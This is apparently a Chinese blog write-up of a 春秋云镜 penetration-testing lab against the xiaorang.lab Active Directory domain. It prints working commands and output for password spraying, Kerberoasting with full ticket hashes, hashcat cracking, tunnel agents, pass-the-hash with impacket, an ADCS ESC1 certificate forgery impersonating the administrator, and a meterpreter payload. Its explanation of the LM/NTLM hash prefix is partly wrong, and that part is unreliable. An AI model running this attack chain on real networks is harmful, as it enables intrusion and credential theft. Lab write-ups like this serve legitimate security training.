+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ca9516504531bf2370b7ea0219d56d78.png"></p>
+<p>开始爆破</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains crackmapexec smb  172.22.9.26 -u user.txt -p pwd.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/c0862119d452fca9b17d488e8eeaa2e8.png"></p>
+<p>xiaorang.lab\zhangjian:i9XDE02pLVf 但是rdp登录不上去</p>
+<p>根据提示看spn</p>
+<blockquote>
+<p>在 Windows Active Directory（AD）环境中，<strong>SPN（Service Principal Name，服务主体名称）</strong> 是一个唯一标识服务实例的名称，用于 Kerberos 认证过程中，让客户端能够识别并向特定服务进行身份验证。</p>
+<p>对于<strong>域用户（Domain User）</strong> 而言，其 SPN 通常是指该用户被配置为运行某个服务时，为该服务注册的 SPN。简单来说，当一个域用户被用作服务账户（例如运行 Web 服务、数据库服务等）时，需要为该用户关联对应的 SPN，以便客户端通过 Kerberos 向该服务认证。</p>
+<p>域用户 SPN 的格式</p>
+<p>SPN 的基本格式为：<br><code>服务类/主机[:端口]/服务名</code></p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">──(root㉿kali)-[~/data]
+└─# proxychains impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf
+
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.9.7:389  ...  OK
+ServicePrincipalName                   Name      MemberOf  PasswordLastSet             LastLogon                   Delegation 
+-------------------------------------  --------  --------  --------------------------  --------------------------  ----------
+TERMSERV/desktop-cbktvmo.xiaorang.lab  zhangxia            2023-07-14 00:45:45.213944  2025-08-12 11:05:49.595730             
+WWW/desktop-cbktvmo.xiaorang.lab/IIS   zhangxia            2023-07-14 00:45:45.213944  2025-08-12 11:05:49.595730             
+TERMSERV/win2016.xiaorang.lab          chenchen            2023-07-14 00:45:39.767035  &lt;never&gt;                                
+
+
+
+[-] CCache file is not found. Skipping...
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.9.7:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.9.7:88  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.9.7:88  ...  OK
+$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$f093afb31abc8b185173840e39c4b8d7$e110b66b21d3d6661fc03e13583677f35e53fb3c19f8c2b687dc0501ddba746754eb1217a142d9efb36e06213f127004a08f81c49555474f8ac6405a1201917f26ae4ce4225d09e985e842a1f131ddcbee786c740a3524c8babbd36486d00d95db2f137f149f7462b504ac7922edc291cd62989a9cb0fe99ad91852a8b1eac20da7e6e431012e557812e44b48e1183c4a795ffdb29b253bda8048c8300b1b285bcb3e210f579ee2eb4aec255d3b8dbbf82c93d85d853f050ad2365523fc2b18c1c08b96135ccf60bce476d30a3b7856eeb5f36d3586daba858376a8c36cfa5df939cf347beca0a89f364ed391c52b7a40b3410d5ae3f3990f11212a4263ad129c64ecc4e48e3f42c555baa956029073aa6559dc89630536e0243d356b44ffcc3e9f505c99f9684230ef5467ff11ff2647a25c76896b67bf12c11f6b1b203607bf59b9ecf64b826b71ff0124186d6417e8d535febd7dbf62669eb51a14743b92d6db14332ed49aa8fa7d2ab3449c302d2452050cfb6a3de0c5f899766a2f608112e49c88483db18143cded77ad0a5d154476a35e6037d670c8e203e25109acbb05b84aee0269fb132c0b0706686cf0957ff70b0c357e708a6629379478614759a816788d6f9e4a9464670f2088b7b4741aafd1492971e700cc1a85a4b773a5518695c3a44f13d4feff7c01c37895f12f6f39d5c981b7bb1c31dc05feed2fe7e1be95cd3b09d085256e3c49c24b347c1be7f876449bc43ea9caba61f3380f879215f7d9116c9433b393513c4fa28d0dc819cebc6ee12806169b86d3511bd02699284e8c91dd44eb3b199ffaa41949196706ecd236d6a34293711db81c7b3a744aeb2a438426e5e4cc0654de099d1278caf72a3d25497eadce4617cd0765c1073925c8dd18ba5290472deb1d76c66c1e8a1b22635510331e348a2f0b1b0b3544d82d1b48b79792bc32210495846fd034a7715cb646ca9c949207919369cb5c544ea194e69c1599d18307798150fd36285e8ca785bb44fa54b904174afbeb1da0a8f0bf6fdadef00d7ab94f31342411b498e599b7d0244d5ce3c9d7eded7afa4167600f3f61c16ffea20887514d3cddfe5fac6fe450c73f4ef0f62840869c8787cee5392dcdb000f1aa3c44821fd40cd9b9519c00f2feefe1103b07d053f211d2dfb9c5a48dd72362f2de94409cd0ed5d174ab3ccbbe08199e582021b4121283a119700138d10c7eeaebde76876a6a1f6af4ecb34e3c261fcd020314bf670847d2a67f86e75c78b92590ecd89a517ed28cf08434b0fb17e88f06aa6d2159e274fa9f435ec82bd5a45652acd303fca59f793e391e67661d74a5684a307b837553f32bdfaa4489478937caed0193ae5bc658549d661487aeb12d7786b4c42543cced6be37b79045c7ded460663207ace3c928c50651e40d5682b84cabc2d452c5cf7dbca1c2d8c54504a8a4514fffd65ea3eafb728bf4ba0232d5bd1700f28188bb42b845bf8394a9abfb4e08da9bf7001
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.9.7:88  ...  OK
+$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$2bc5d8eada5a51a14c4d06c44d3fc995$a170dfe49730d9d912b19a58038edf5ba8f1cf594dafe5eedf1c7a70b15b946538434458c47dd8c4434e5c6618384a4970c9fcc7a37ec45c7feac459e5cf50faf407af0562779b005517727a5144fbf7253b2c0f9e2bb7da5c609fe83683076186a9a1f7a204bf1e54624659a5bbb79a6f78c7bc5d2a10ab8a25cade100312b72f3421245279699a088a63abb842767b1f3c9110f6071d941a7ce625d32f7ee390abb43f5667f721db0d746b9dbcfb6d649ac343904640e7fb8114585a6134f94ceff302e6145279b7c2a9a7262385046144572be7a85fd1b48f0d63f7154198a4716cc601de00c969841828f6d580f5f76222e59bb2ca545dc3ea01e6980087f11695558acc7ccece30f57872c2a46d1b2140e1a4f247451ba0164bea081cd9bff57d0868c8d258602970b8787f2e50c3ce4d611a529d7b108d580c9d2eb1a952515575405682124b28e1b678922a2b84ecbce0c326744b4450b81ef8250a09755eed3fe77dc7bb89df91a0574674ec6275174c784e5f1d18bfe5283e7aa11758f7fa1f53ed32baedcf748afa51a11810f53d90364eb2be277c08b0e41c66e9c660cd0746041c051f928d818441ba49512d07f660c7f6dae109837384ad36e3a768394bd9047faf939aef8cb468e57d8fbd39c861e3899797854a5160bd88e78d081d0c7039d9014eab1ba488b0f47dddc28f6aefc097dcebede6674262f618fa5ba6b91b863a1d5f7e263296614075cd310c536eb873b7174ca4dacaf340eefdb340c3476f17b891066b3af20638b06122c95a8a3f8ae71b4e36178d86d7ec7b8d16ad88c55fedb75a82f290793174e2b9a1ec09fb01940857f9e00acd0c8aa414fef2177361f8cd83cda94dfef33f8d79c4aa4ba79707987f295cb962f2ebcf53953cb7dcd697d40c8feade39bf7c58031144c7bbd2fa9cac36727d0b6516ee23494da31770514bb8d8beb7c6c63fa83e2fd5e4285798914d367fa427087c68d8e2b63b88020c32ba6dc8b34aa0c3d16b03014278d42084efe38d77f561f0887a734b863bc45ad38e2d5181ec27d3cf13d31b346dda9710048350a5afab68044506b6622f3a8ea5d0262750dae4d68b3691795320c216e253c97efbe8a52d0956e88ac38425af2b6ca1ebc94fe6041bdcc6494acdc8a1c32cd5216050c87b840665a9b19806aa502c75e88418aa8fb6ddea5fe9dbedd3c1625529595440f04fdf48a79ac403a0e0ed1d9ff6c56a73a0dcea00baa74d5daeb4f9d8b41ba8e47382e341f6760dec7e8d7aa2d6d2ed971829227c0e344e84cf6b23c55fdb7a0b2e13004f266f3acac8c95b696faba323da5704e2fcdaa54add1197a0a5f113212f63411e2926b9475fac1fee961a572b1ef78244bc8de6fc9f5d80fc8cefb7071bceb83d6b8f2414b1e1728a20ef9baa8ea43bc18c0ef26083a64cc693ae780e2da71524a6b8c99ab5ba080482b63da2fcccfa516c71f9beac9d038e20a88f20641fe1e71cabcd91e76665cd1f26
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<ul>
+<li><strong><code>impacket-GetUserSPNs</code></strong>：Impacket 工具集中的一款工具，用于枚举域内关联了 SPN 的用户，并可请求其 TGS 票据（用于后续破解哈希）。</li>
+<li><strong><code>-request</code></strong>：触发 TGS 票据请求，工具会获取目标用户的 Kerberos TGS 票据哈希（<code>krb5tgs</code> 类型）。</li>
+<li><strong><code>-dc-ip 172.22.9.7</code></strong>：指定域控制器（DC）的 IP 地址（避免 DNS 解析依赖）。</li>
+<li><strong><code>xiaorang.lab/zhangjian:i9XDE02pLVf</code></strong>：域用户认证信息，格式为 <code>域名/用户名:密码</code>。</li>
+<li></li>
+</ul>
+<ol>
+<li><p><strong>枚举 SPN</strong>：查询 <code>zhangjian</code> 关联的所有 SPN（如 <code>HTTP/server01.xiaorang.lab</code> 等）。</p>
+</li>
+<li><p><strong>请求 TGS 票据</strong>：针对每个 SPN，使用用户密码 <code>i9XDE02pLVf</code> 向 DC 认证，获取加密的 TGS 票据（哈希值）。</p>
+</li>
+<li><p><strong>输出哈希</strong>：将 TGS 票据哈希以 <code>hashcat</code> 可识别的格式（如 <code>-m 13100</code> 类型）输出，用于后续破解（若密码复杂，可通过字典攻击还原）。</p>
+<pre class="line-numbers language-none"><code class="language-none">$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$[哈希值1]$[哈希值2]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ol>
+<li><strong><code>krb5tgs</code></strong>：标识这是 Kerberos TGS 票据的哈希。</li>
+<li><strong><code>23</code></strong>：表示加密算法为 <strong>RC4-HMAC</strong>（etype 23），这是一种相对脆弱的加密方式，使得哈希可被破解。</li>
+<li><strong><code>zhangxia</code></strong>：关联的域用户名（即该票据属于域用户 <code>zhangxia</code>）。</li>
+<li><strong><code>XIAORANG.LAB</code></strong>：Active Directory 域名（域环境的名称）。</li>
+<li><strong><code>xiaorang.lab/zhangxia</code></strong>：服务主体名称（SPN），表示该票据对应的服务实例（此处 SPN 格式为 <code>域名/用户名</code>，可能是一个自定义服务或用户关联的特定服务）。</li>
+<li><strong>后续长字符串</strong>：RC4-HMAC 加密的票据数据（包含用用户密码哈希加密的部分，破解后可得到用户明文密码）。</li>
+</ol>
+</li>
+</ol>
+</blockquote>
+<p>然后使用hashcat进行破解</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(q1n9㉿LAPTOP-3H92FD9J)-[~]
+└─$ hashcat -a 0 -m 13100 --force 1.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<ul>
+<li><code>-a 0</code>：字典攻击模式。</li>
+<li><code>-m 13100</code>：指定哈希类型为 Kerberos TGS etype 23。</li>
+</ul>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d0fd4b1071a320cc38277efa0bbc958b.png"></p>
+<p><code>MyPass2@@6</code></p>
+<pre class="line-numbers language-none"><code class="language-none">upload /home/kali/桌面/tools/tools/Stotaway-bin/linux_x64_agent /tmp/1/linux_x64_agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">39.99.137.92
+
+./windows_x64_admin.exe -c 39.99.137.92:7870 -s 123
+
+./linux_x64_agent -l 7870 -s 123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ce0eefc91f9cf479ce18609a0746c087.png"></p>
+<p>提不了权</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/597347275186a50a6d0c132e6cb32599.png"></p>
+<p>我这里不知道为啥远程链接电脑不行，用的kali远程操作</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/089266cd8855b7947da93fcef8d1dc1a.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.26  -codec gbk
+ 
+type C:\Users\administrator\flag\flag03.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/1fddf2db6714d97675b6a7523825c22e.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains /usr/bin/impacket-wmiexec -hashes :2f1b57eefb2d152196836b0516abea80 administrator@172.22.9.7 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">proxychains4 impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7  -codec gbk
+
+type C:\Users\administrator\flag\flag04.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f31eee1f1b7f4ff68d37bf9555f79ba5.png"></p>
+<hr>
+<p>或远程</p>
+<pre class="line-numbers language-none"><code class="language-none">──(root㉿kali)-[~]
+└─# proxychains certipy-ad find -u 'zhangxia@xiaorang.lab' -password 'MyPass2@@6' -dc-ip 172.22.9.7 -vulnerable -stdout
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.9.7:636  ...  OK
+[*] Finding certificate templates
+[*] Found 35 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 13 enabled certificate templates
+[*] Trying to get CA configuration for 'xiaorang-XIAORANG-DC-CA' via CSRA
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  XIAORANG-DC.xiaorang.lab:135 &lt;--socket error or timeout!
+[!] Got error while trying to get CA configuration for 'xiaorang-XIAORANG-DC-CA' via CSRA: Could not connect: [Errno 111] Connection refused
+[*] Trying to get CA configuration for 'xiaorang-XIAORANG-DC-CA' via RRP
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  XIAORANG-DC.xiaorang.lab:445 &lt;--socket error or timeout!
+[!] Got error while trying to get CA configuration for 'xiaorang-XIAORANG-DC-CA' via RRP: [Errno Connection error (224.0.0.1:445)] [Errno 111] Connection refused
+[!] Failed to get CA configuration for 'xiaorang-XIAORANG-DC-CA'
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  XIAORANG-DC.xiaorang.lab:80 &lt;--socket error or timeout!
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : xiaorang-XIAORANG-DC-CA
+    DNS Name                            : XIAORANG-DC.xiaorang.lab
+    Certificate Subject                 : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab
+    Certificate Serial Number           : 43A73F4A37050EAA4E29C0D95BC84BB5
+    Certificate Validity Start          : 2023-07-14 04:33:21+00:00
+    Certificate Validity End            : 2028-07-14 04:43:21+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Unknown
+    Request Disposition                 : Unknown
+    Enforce Encryption for Requests     : Unknown
+Certificate Templates
+  0
+    Template Name                       : XR Manager
+    Display Name                        : XR Manager
+    Certificate Authorities             : xiaorang-XIAORANG-DC-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : PublishToDs
+                                          IncludeSymmetricAlgorithms
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Encrypting File System
+                                          Secure Email
+                                          Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : XIAORANG.LAB\Domain Admins
+                                          XIAORANG.LAB\Domain Users
+                                          XIAORANG.LAB\Enterprise Admins
+                                          XIAORANG.LAB\Authenticated Users
+      Object Control Permissions
+        Owner                           : XIAORANG.LAB\Administrator
+        Write Owner Principals          : XIAORANG.LAB\Domain Admins
+                                          XIAORANG.LAB\Enterprise Admins
+                                          XIAORANG.LAB\Administrator
+        Write Dacl Principals           : XIAORANG.LAB\Domain Admins
+                                          XIAORANG.LAB\Enterprise Admins
+                                          XIAORANG.LAB\Administrator
+        Write Property Principals       : XIAORANG.LAB\Domain Admins
+                                          XIAORANG.LAB\Enterprise Admins
+                                          XIAORANG.LAB\Administrator
+    [!] Vulnerabilities
+      ESC1                              : 'XIAORANG.LAB\\Domain Users' and 'XIAORANG.LAB\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>申请 XR Manager 证书模版并伪造域管理员，得到administrator.pfx,然后利用administrator.pfx证书获取 TGT 和 NTLM Hash</p>
+<p>但是要注意，要改一下hosts，不然会超时（超时的话多试几次）</p>
+<pre class="line-numbers language-none"><code class="language-none">──(root㉿kali)-[~]
+└─# proxychains certipy-ad req -u 'zhangxia@xiaorang.lab' -p 'MyPass2@@6' -target 172.22.9.7 -dc-ip 172.22.9.7 -ca "xiaorang-XIAORANG-DC-CA" -template 'XR Manager'  -upn administrator@xiaorang.lab
+
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.9.7:445  ...  OK
+[*] Successfully requested certificate
+[*] Request ID is 8
+[*] Got certificate with UPN 'administrator@xiaorang.lab'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>得到administrator.pfx，使用获得的证书获取域管哈希</p>
+<pre class="line-numbers language-none"><code class="language-none">proxychains certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>运行结果如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/44c58a042414af3e47c1ba697a20eeab.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2d9d04b9091b021d3399a345de303431.png"></p>
+<p>但我这边还是不行（，不知道为什么</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/91561282ac42a604c863db1a10552666.png"></p>
+<blockquote>
+<pre class="line-numbers language-none"><code class="language-none">aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li><strong>前半段（<code>aad3b435b51404eeaad3b435b51404ee</code>）</strong><br>这是 <strong>NTLM 哈希的固定前缀</strong>（也叫 “NTLM 空密码哈希” 或 “通用 Salt”），本质是 <code>HMAC-MD5</code> 处理后的固定值，常用于标识这是 NTLM 哈希格式。</li>
+<li><strong>后半段（<code>2f1b57eefb2d152196836b0516abea80</code>）</strong><br>这是 <strong>实际的 NTLM 哈希值</strong>，由用户密码经过 NTLM 算法（<code>MD4</code> 或 <code>MD5</code> 变体，因版本而异）计算生成。</li>
+</ul>
+</blockquote>
+<p>然后hash传递就行</p>
+<hr>
+<pre class="line-numbers language-none"><code class="language-none">cd "/mnt/d/软件工具/渗透/tools/马"
+msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=7654 -f elf -o 7.elf
+C:/1/7.exe
+
+proxychains msfconsole
+use exploit/multi/handler
+set payload linux/x64/meterpreter/bind_tcp
+set rhost 39.98.109.189
+set lport 7654
+run
+
+upload /home/kali/7.elf /tmp/7.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">q1n9</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2025/08/13/certify/">http://example.com/2025/08/13/certify/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">q1n9</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">
+                                    <span class="chip bg-color">春秋云镜</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">渗透</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2025/08/17/exchanges/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="Exchanges">
+                        
+                        <span class="card-title">Exchanges</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-08-17
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
+                                    网安
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">
+                        <span class="chip bg-color">春秋云镜</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">渗透</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/08/13/brute4road/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="brute4road">
+                        
+                        <span class="card-title">brute4road</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-08-13
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
+                                    网安
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">
+                        <span class="chip bg-color">春秋云镜</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">渗透</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
